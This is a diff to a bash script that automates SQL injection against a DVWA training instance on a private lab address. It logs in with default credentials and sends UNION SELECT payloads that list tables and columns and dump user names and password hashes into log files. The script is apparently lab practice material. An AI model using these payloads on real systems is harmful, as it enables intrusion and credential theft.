@@ -1,10 +1,14 @@
 #!/bin/bash
 
+SECURITY="medium" #security level
+USER="admin" #username
+PASS="password" #password
+
 rm cookies.txt #removes old file with cookies
 
 #saves login cookies and login page html to local files
 curl -s -c cookies.txt \
--b "security=medium" \
+-b "security=$SECURITY" \
 http://192.168.56.105/DVWA/login.php \
 >login.html
 
@@ -13,35 +17,48 @@ PHPSESSID=$(awk '$6=="PHPSESSID"{print $7}' cookies.txt) #saves PHP session ID f
 
 #logs in using cookies and user token
 curl -s -b cookies.txt \
--b "security=medium" \
--d "username=admin&password=password&user_token=$TOKEN&Login=Login" \
+-b "security=$SECURITY" \
+-d "username=$USER&password=$PASS&user_token=$TOKEN&Login=Login" \
 http://192.168.56.105/DVWA/login.php
 
 
-#saves result of table name retrieval to local log file 
-curl -X POST \
--b "PHPSESSID=$PHPSESSID; security=medium" \
--H "Content-Type: application/x-www-form-urlencoded" \
--d "id=1%20UNION%20SELECT%20table_name%2C%20NULL%20%20FROM%20information_schema.tables%20%20WHERE%20table_schema%20%3D%20database%28%29%23&Submit=Submit" \
-http://192.168.56.105/DVWA/vulnerabilities/sqli/ \
-| grep -oP 'First name: \K[^<]+' \
-> /home/kali/tables.log 2>&1
+
+#saves result of table name retrieval to local log file
+{
+echo "Security level: $SECURITY"
+echo "Attempting to retrieve table names..."
+echo "---------------------------------------------------"
+RESPONSE=$(curl -s -X POST \
+  -b "PHPSESSID=$PHPSESSID; security=$SECURITY" \
+  -d "id=1 UNION SELECT table_name, NULL  FROM information_schema.tables  WHERE table_schema = database()#&Submit=Submit" \
+  http://192.168.56.105/DVWA/vulnerabilities/sqli/)
+echo "$RESPONSE" | grep -oP 'First name: \K[^<]+' | tail -n +2 #Removes header (First name:) from result and removes the first line (admin admin)
+}> /home/kali/sqli_medium1.log
+
+
 
 #saves result of column name retrieval to local log file
-curl -X POST \
--b "PHPSESSID=$PHPSESSID; security=medium" \
--H "Content-Type: application/x-www-form-urlencoded" \
--d "id=1%20UNION%20SELECT%20column_name%2C%20NULL%20%20FROM%20information_schema.columns%20%20WHERE%20table_name%20%3D%200x7573657273%23&Submit=Submit" \
-http://192.168.56.105/DVWA/vulnerabilities/sqli/ \
-| grep -oP 'First name: \K[^<]+' \
-> /home/kali/columns.log 2>&1
+{
+echo "Security level: $SECURITY"
+echo "Attempting to retrieve column names..."
+echo "---------------------------------------------------"
+RESPONSE=$(curl -s -X POST \
+  -b "PHPSESSID=$PHPSESSID; security=$SECURITY" \
+  -d "id=1 UNION SELECT column_name, NULL  FROM information_schema.columns  WHERE table_name = 0x7573657273#&Submit=Submit" \
+  http://192.168.56.105/DVWA/vulnerabilities/sqli/)
+echo "$RESPONSE" | grep -oP 'First name: \K[^<]+' | tail -n +2 #Removes header (First name:) from result and removes the first line (admin admin)
+}> /home/kali/sqli_medium2.log
+
+
 
 #saves result of credential retrieval to local log file
-curl -X POST \
--b "PHPSESSID=$PHPSESSID; security=medium" \
--H "Content-Type: application/x-www-form-urlencoded" \
--d "id=1%20UNION%20SELECT%20user,%20password%20FROM%20users%23&Submit=Submit" \
-http://192.168.56.105/DVWA/vulnerabilities/sqli/ \
-| grep -oP 'First name: \K[^<]+|Surname: \K[^<]+' \
-| paste - - \
-> /home/kali/credentials.log 2>&1
+{
+echo "Security level: $SECURITY"
+echo "Attempting to retrieve credentials..."
+echo "---------------------------------------------------"
+RESPONSE=$(curl -s -X POST \
+  -b "PHPSESSID=$PHPSESSID; security=$SECURITY" \
+  -d "id=1 UNION SELECT user, password FROM users#&Submit=Submit" \
+  http://192.168.56.105/DVWA/vulnerabilities/sqli/)
+echo "$RESPONSE" | grep -oP 'First name: \K[^<]+|Surname: \K[^<]+' | paste - - | tail -n +2 #Removes header (First name:) from result and removes the first line (admin admin). Returns username and password on the same line
+}> /home/kali/sqli_medium3.log
